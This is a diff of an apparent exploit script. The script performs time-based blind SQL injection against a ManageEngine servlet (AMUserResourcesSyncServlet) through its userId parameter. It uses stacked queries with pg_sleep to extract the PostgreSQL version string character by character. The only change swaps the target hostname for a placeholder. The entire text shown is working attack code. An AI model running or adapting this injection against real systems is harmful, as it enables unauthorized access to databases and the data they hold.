@@ -15,7 +15,7 @@ def make_request(url, sql):
 for i in range(1,50):
     for j in range(65,122): 
         sql = f"select case when(ascii(substr(version(),{i},1))={j}) then pg_sleep(1) end"
-        url = "https://manageengine:8443/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;%s;--"
+        url = "https://xxxxx:8443/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;%s;--"
         total_time =make_request(url,sql)
         if total_time > 1:
             print("%s" % chr(j))
